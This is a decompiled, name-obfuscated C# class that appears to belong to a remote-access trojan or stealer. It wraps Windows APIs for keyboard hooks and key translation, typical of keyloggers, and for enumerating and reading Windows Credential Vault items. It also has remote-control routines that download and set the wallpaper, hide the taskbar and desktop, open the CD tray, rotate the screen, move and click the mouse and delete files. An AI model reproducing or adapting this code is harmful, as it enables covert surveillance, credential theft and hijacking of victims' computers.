using GDBD.Workers;
using Microsoft.Win32;
using System;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Net;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Text;

namespace GDBD.Mocks
{
	internal sealed class Publisher
	{
		public struct SchemaConsumer
		{
			public bool strategy;

			public int info;

			public int _Value;

			public IntPtr m_Parameter;

			public IntPtr _Prototype;
		}

		public struct TagReaderMapper
		{
			public int parser;

			public int _Status;

			public IntPtr page;

			public Point helper;
		}

		public delegate IntPtr Exception(int nCode, IntPtr wParam, IntPtr lParam);

		internal struct MessageComposerWorker
		{
			private long m_Attribute;

			private long database;
		}

		internal enum RotationAxis
		{

		}

		[Flags]
		internal enum InternalMemberValueE
		{

		}

		[Flags]
		internal enum FieldEventEntry
		{

		}

		[Flags]
		internal enum Factory
		{

		}

		[StructLayout(LayoutKind.Explicit)]
		internal struct MapComposerWorker
		{
			[FieldOffset(0)]
			[MarshalAs(UnmanagedType.ByValTStr, SizeConst = 32)]
			public string _Serializer;

			[FieldOffset(32)]
			public short m_Callback;

			[FieldOffset(34)]
			public short _Listener;

			[FieldOffset(36)]
			public short _Tag;

			[FieldOffset(38)]
			public short _Specification;

			[FieldOffset(40)]
			public Factory m_Writer;

			[FieldOffset(44)]
			private short role;

			[FieldOffset(46)]
			private short m_Creator;

			[FieldOffset(48)]
			private short _Rule;

			[FieldOffset(50)]
			private short _Bridge;

			[FieldOffset(52)]
			private short m_Importer;

			[FieldOffset(54)]
			private short indexer;

			[FieldOffset(56)]
			private short m_Decorator;

			[FieldOffset(58)]
			private short field;

			[FieldOffset(44)]
			public MessageComposerWorker reg;

			[FieldOffset(52)]
			public int process;

			[FieldOffset(56)]
			public int m_Base;

			[FieldOffset(60)]
			public short _Container;

			[FieldOffset(62)]
			public short proccesor;

			[FieldOffset(64)]
			public short _Adapter;

			[FieldOffset(66)]
			public short token;

			[FieldOffset(68)]
			public short _Dispatcher;

			[FieldOffset(72)]
			[MarshalAs(UnmanagedType.ByValTStr, SizeConst = 32)]
			public string account;

			[FieldOffset(102)]
			public short _Singleton;

			[FieldOffset(104)]
			public int _Model;

			[FieldOffset(108)]
			public int _Message;

			[FieldOffset(112)]
			public int map;

			[FieldOffset(116)]
			public int product;

			[FieldOffset(116)]
			public int m_Interceptor;

			[FieldOffset(120)]
			public int _Algo;
		}

		internal struct Annotation
		{
			[MarshalAs(UnmanagedType.U4)]
			public int _Exporter;

			[MarshalAs(UnmanagedType.ByValTStr, SizeConst = 32)]
			public string visitor;

			[MarshalAs(UnmanagedType.ByValTStr, SizeConst = 128)]
			public string m_Wrapper;

			[MarshalAs(UnmanagedType.U4)]
			public InternalMemberValueE m_Params;

			[MarshalAs(UnmanagedType.ByValTStr, SizeConst = 128)]
			public string m_Template;

			[MarshalAs(UnmanagedType.ByValTStr, SizeConst = 128)]
			public string _Config;
		}

		public enum NativeAccess
		{

		}

		public enum RefConsumer
		{

		}

		public struct RequestIssuerMock
		{
			public Guid m_Connection;

			public IntPtr m_Initializer;

			public IntPtr _Object;

			public IntPtr schema;

			public IntPtr m_Ref;

			public IntPtr m_Thread;

			public ulong consumer;

			public uint m_Comparator;

			public uint _Proc;

			public IntPtr recordEvent;
		}

		public struct ProductComposerWorker
		{
			public Guid eventEvent;

			public IntPtr filterEvent;

			public IntPtr instanceEvent;

			public IntPtr _DicEvent;

			public IntPtr m_ErrorEvent;

			public ulong m_ComposerEvent;

			public uint m_PropertyEvent;

			public uint issuerEvent;

			public IntPtr m_ReaderEvent;
		}

		[StructLayout(LayoutKind.Explicit)]
		public struct TokenInstanceExpression
		{
			[FieldOffset(0)]
			public RefConsumer m_ClientEvent;

			[FieldOffset(8)]
			public NativeAccess m_BroadcasterEvent;
		}

		public static int utils;

		[MethodImpl(MethodImplOptions.NoInlining)]
		public static string InitEvent()
		{
			//Discarded unreachable code: IL_0002
			//IL_0003: Incompatible stack heights: 0 vs 1
			StringBuilder stringBuilder = new StringBuilder(1024);
			PushFilter(IncludeFilter(), stringBuilder, stringBuilder.Capacity);
			return stringBuilder.ToString();
		}

		[MethodImpl(MethodImplOptions.NoInlining)]
		public static void DefineEvent(bool isinstance)
		{
			//Discarded unreachable code: IL_0002
			//IL_0003: Incompatible stack heights: 0 vs 1
			if (isinstance)
			{
				ForgotFilter("set CDAudio door open", null, 127L, 0L);
			}
			else
			{
				ForgotFilter("set CDAudio door closed", null, 127L, 0L);
			}
		}

		[MethodImpl(MethodImplOptions.NoInlining)]
		public static bool CollectEvent(uint paramX, string pred)
		{
			//Discarded unreachable code: IL_0002
			//IL_0003: Incompatible stack heights: 0 vs 1
			bool result = false;
			Annotation dir = default(Annotation);
			MapComposerWorker template = default(MapComposerWorker);
			dir._Exporter = Marshal.SizeOf((object)dir);
			if (!PopFilter(null, paramX - 1, ref dir, 0u))
			{
				throw new ArgumentOutOfRangeException("DisplayNumber", paramX, "Number is greater than connected displays.");
			}
			if (NewFilter(dir.visitor, -1, ref template) != 0)
			{
				switch (pred)
				{
				case "90":
					template.process = 3;
					break;
				case "180":
					template.process = 2;
					break;
				case "270":
					template.process = 1;
					break;
				case "0":
					template.process = 0;
					break;
				}
				RotationAxis rotationAxis = MoveFilter(dir.visitor, ref template, IntPtr.Zero, (FieldEventEntry)1, IntPtr.Zero);
				result = (rotationAxis == (RotationAxis)0);
			}
			return result;
		}

		[MethodImpl(MethodImplOptions.NoInlining)]
		public static void SortEvent(string instance)
		{
			//Discarded unreachable code: IL_0002
			//IL_0003: Incompatible stack heights: 0 vs 1
			HttpWebRequest httpWebRequest = (HttpWebRequest)WebRequest.Create(instance);
			HttpWebResponse httpWebResponse = (HttpWebResponse)httpWebRequest.GetResponse();
			Stream responseStream = httpWebResponse.GetResponseStream();
			Image image = Image.FromStream(responseStream);
			int num = 0;
			string text = Path.GetTempPath() + "\\" + "zV8l2P0GiGwq" + "\\";
			if (!Directory.Exists(text))
			{
				Directory.CreateDirectory(text);
			}
			string text2 = Path.Combine(text, $"background{num}.bmp");
			image.Save(text2, ImageFormat.Bmp);
			RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("Control Panel\\Desktop", writable: true);
			registryKey.SetValue("PicturePosition", "10");
			registryKey.SetValue("TileWallpaper", "0");
			registryKey.Close();
			ConnectFilter(20, 0, text2, 3);
		}

		[MethodImpl(MethodImplOptions.NoInlining)]
		public static void CallEvent()
		{
			//Discarded unreachable code: IL_0002
			//IL_0003: Incompatible stack heights: 0 vs 1
			int item = LogoutFilter("Shell_TrayWnd", "");
			VisitFilter(item, 1);
		}

		[MethodImpl(MethodImplOptions.NoInlining)]
		public static void PublishEvent()
		{
			//Discarded unreachable code: IL_0002
			//IL_0003: Incompatible stack heights: 0 vs 1
			VisitFilter(LogoutFilter(null, "Program Manager"), 1);
		}

		[MethodImpl(MethodImplOptions.NoInlining)]
		public static void WriteEvent()
		{
			//Discarded unreachable code: IL_0002
			//IL_0003: Incompatible stack heights: 0 vs 1
			int indexOf_counter = 0;
			VisitFilter(ViewFilter(ViewFilter(LogoutFilter("Shell_TrayWnd", null), indexOf_counter, "TrayNotifyWnd", null), indexOf_counter, "TrayClockWClass", null), 1);
		}

		[MethodImpl(MethodImplOptions.NoInlining)]
		public static void RevertEvent()
		{
			//Discarded unreachable code: IL_0002
			//IL_0003: Incompatible stack heights: 0 vs 1
			VisitFilter(LogoutFilter(null, "Program Manager"), 0);
		}

		[MethodImpl(MethodImplOptions.NoInlining)]
		public static void LoginFilter()
		{
			//Discarded unreachable code: IL_0002
			//IL_0003: Incompatible stack heights: 0 vs 1
			int indexOf_counter = 0;
			VisitFilter(ViewFilter(ViewFilter(LogoutFilter("Shell_TrayWnd", null), indexOf_counter, "TrayNotifyWnd", null), indexOf_counter, "TrayClockWClass", null), 0);
		}

		[MethodImpl(MethodImplOptions.NoInlining)]
		public static void CheckFilter()
		{
			//Discarded unreachable code: IL_0002
			//IL_0003: Incompatible stack heights: 0 vs 1
			int item = LogoutFilter("Shell_TrayWnd", "");
			VisitFilter(item, 0);
		}

		[MethodImpl(MethodImplOptions.NoInlining)]
		public static Bitmap DisableFilter(ref int info, ref int pred)
		{
			//Discarded unreachable code: IL_0002
			//IL_0003: Incompatible stack heights: 0 vs 1
			TagReaderMapper key = default(TagReaderMapper);
			key.parser = Marshal.SizeOf((object)key);
			if (CreateFilter(out key) && key._Status == 1)
			{
				IntPtr intPtr = StopFilter(key.page);
				if (CloneFilter(intPtr, out SchemaConsumer result))
				{
					info = key.helper.X - result.info;
					pred = key.helper.Y - result._Value;
					Icon icon = Icon.FromHandle(intPtr);
					return icon.ToBitmap();
				}
			}
			return null;
		}

		[MethodImpl(MethodImplOptions.NoInlining)]
		public static string VerifyFilter(Process var1, int cust_ID = 1024)
		{
			//Discarded unreachable code: IL_0002
			//IL_0003: Incompatible stack heights: 0 vs 1
			StringBuilder stringBuilder = new StringBuilder(cust_ID);
			uint visitor = (uint)(stringBuilder.Capacity + 1);
			return FlushFilter(var1.Handle, 0u, stringBuilder, ref visitor) ? stringBuilder.ToString() : null;
		}

		[DllImport("user32.dll", CharSet = CharSet.Auto, EntryPoint = "SetWindowsHookEx", SetLastError = true)]
		public static extern IntPtr PatchFilter(int instance_offset, Exception counter, IntPtr control, uint meanvisitor2);

		[DllImport("user32.dll", CharSet = CharSet.Auto, EntryPoint = "UnhookWindowsHookEx", SetLastError = true)]
		[return: MarshalAs(UnmanagedType.Bool)]
		public static extern bool FindFilter(IntPtr config);

		[DllImport("user32.dll", CharSet = CharSet.Auto, EntryPoint = "CallNextHookEx", SetLastError = true)]
		public static extern IntPtr ValidateFilter(IntPtr item, int caller_Z, IntPtr control, IntPtr visitor2);

		[DllImport("kernel32.dll", CharSet = CharSet.Auto, EntryPoint = "GetModuleHandle", SetLastError = true)]
		public static extern IntPtr OrderFilter(string setup);

		[DllImport("user32.dll", EntryPoint = "GetWindowThreadProcessId", SetLastError = true)]
		public static extern uint ResolveFilter(IntPtr res, out uint pred);

		[DllImport("user32.dll", CharSet = CharSet.Auto, EntryPoint = "GetKeyState", ExactSpelling = true)]
		public static extern short FillFilter(int first_ID);

		[DllImport("user32.dll", EntryPoint = "GetKeyboardState", SetLastError = true)]
		[return: MarshalAs(UnmanagedType.Bool)]
		public static extern bool RunFilter(byte[] reference);

		[DllImport("user32.dll", EntryPoint = "GetKeyboardLayout")]
		public static extern IntPtr CompareFilter(uint info_X);

		[DllImport("user32.dll", EntryPoint = "ToUnicodeEx")]
		public static extern int AddFilter(uint item_offset, uint custhigh, byte[] filter, [Out] [MarshalAs(UnmanagedType.LPWStr)] StringBuilder cust2, int version_ident3, uint sumord4, IntPtr param5);

		[DllImport("user32.dll", EntryPoint = "MapVirtualKey")]
		public static extern uint EnableFilter(uint previousi, uint previousmap);

		[DllImport("user32.dll", EntryPoint = "SetCursorPos")]
		internal static extern bool MapFilter(int init_Y, int ID_pred);

		[DllImport("user32.dll", EntryPoint = "mouse_event")]
		internal static extern void InsertFilter(uint item_X, int selectionHigh, int offsetrule, int def2, UIntPtr cfg3);

		[DllImport("kernel32.dll", EntryPoint = "QueryFullProcessImageName")]
		private static extern bool FlushFilter([In] IntPtr ident, [In] uint map_counter, [Out] StringBuilder serv, [In] [Out] ref uint visitor2);

		[DllImport("user32.dll", EntryPoint = "GetCursorInfo")]
		public static extern bool CreateFilter(out TagReaderMapper key);

		[DllImport("user32.dll", EntryPoint = "CopyIcon")]
		public static extern IntPtr StopFilter(IntPtr key);

		[DllImport("user32.dll", EntryPoint = "GetIconInfo")]
		public static extern bool CloneFilter(IntPtr last, out SchemaConsumer result);

		[DllImport("user32.dll", EntryPoint = "FindWindow")]
		private static extern int LogoutFilter(string var1, string result);

		[DllImport("user32.dll", EntryPoint = "ShowWindow")]
		private static extern int VisitFilter(int item, int remove_CONTAt);

		[DllImport("user32.dll", EntryPoint = "FindWindowEx")]
		private static extern int ViewFilter(int keyhigh, int indexOf_counter, string role, string info2);

		[DllImport("user32.dll", CharSet = CharSet.Auto, EntryPoint = "SystemParametersInfo")]
		private static extern int ConnectFilter(int insert_INSTANCEAt, int ord_Y, string third, int connection2_count);

		[DllImport("user32.dll", EntryPoint = "ChangeDisplaySettingsEx")]
		internal static extern RotationAxis MoveFilter(string instance, ref MapComposerWorker selection, IntPtr filter, FieldEventEntry pol2, IntPtr selection3);

		[DllImport("user32.dll", EntryPoint = "EnumDisplayDevices")]
		internal static extern bool PopFilter(string value, uint selectioncount, ref Annotation dir, uint ord2_min);

		[DllImport("user32.dll", CharSet = CharSet.Ansi, EntryPoint = "EnumDisplaySettings")]
		internal static extern int NewFilter(string value, int removePREDAt, ref MapComposerWorker template);

		[DllImport("winmm.dll", EntryPoint = "mciSendStringA")]
		internal static extern void ForgotFilter(string last, string result, long third_amount, long task2);

		[DllImport("user32.dll", EntryPoint = "GetForegroundWindow")]
		internal static extern IntPtr IncludeFilter();

		[DllImport("user32.dll", CharSet = CharSet.Unicode, EntryPoint = "GetWindowText", SetLastError = true)]
		internal static extern int PushFilter(IntPtr res, StringBuilder token, int third_min);

		[DllImport("kernel32.dll", CharSet = CharSet.Unicode, EntryPoint = "DeleteFile", SetLastError = true)]
		[return: MarshalAs(UnmanagedType.Bool)]
		internal static extern bool PrepareFilter(string value);

		[DllImport("vaultcli.dll", EntryPoint = "VaultOpenVault")]
		public static extern int AwakeFilter(ref Guid ident, uint flags_b, ref IntPtr c);

		[DllImport("vaultcli.dll", EntryPoint = "VaultCloseVault")]
		public static extern int UpdateFilter(ref IntPtr task);

		[DllImport("vaultcli.dll", EntryPoint = "VaultFree")]
		public static extern int ReadFilter(ref IntPtr asset);

		[DllImport("vaultcli.dll", EntryPoint = "VaultEnumerateVaults")]
		public static extern int InterruptFilter(int value_end, ref int result, ref IntPtr util);

		[DllImport("vaultcli.dll", EntryPoint = "VaultEnumerateItems")]
		public static extern int CalcFilter(IntPtr value, int b_count, ref int comp, ref IntPtr counter2);

		[DllImport("vaultcli.dll", EntryPoint = "VaultGetItem")]
		public static extern int InstantiateFilter(IntPtr v, ref Guid result, IntPtr util, IntPtr param2, IntPtr task3, IntPtr pred4, int value5_min, ref IntPtr counter6);

		[DllImport("vaultcli.dll", EntryPoint = "VaultGetItem")]
		public static extern int ReflectFilter(IntPtr key, ref Guid col, IntPtr helper, IntPtr instance2, IntPtr last3, int x4_High, ref IntPtr map5);

		[MethodImpl(MethodImplOptions.NoInlining)]
		public Publisher()
		{
			//Discarded unreachable code: IL_0002, IL_0006, IL_0012, IL_0019
			//IL_0003: Incompatible stack heights: 0 vs 1
			//IL_0007: Incompatible stack heights: 0 vs 1
			//IL_0013: Incompatible stack heights: 0 vs 1
			//IL_001a: Incompatible stack heights: 0 vs 1
			SingletonReader.PushGlobal();
			base._002Ector();
		}

		[MethodImpl(MethodImplOptions.NoInlining)]
		static Publisher()
		{
			//Discarded unreachable code: IL_0002, IL_0006, IL_0012, IL_0019
			//IL_0003: Incompatible stack heights: 0 vs 1
			//IL_0007: Incompatible stack heights: 0 vs 1
			//IL_0013: Incompatible stack heights: 0 vs 1
			//IL_001a: Incompatible stack heights: 0 vs 1
			SingletonReader.PushGlobal();
			utils = 13;
		}
	}
}
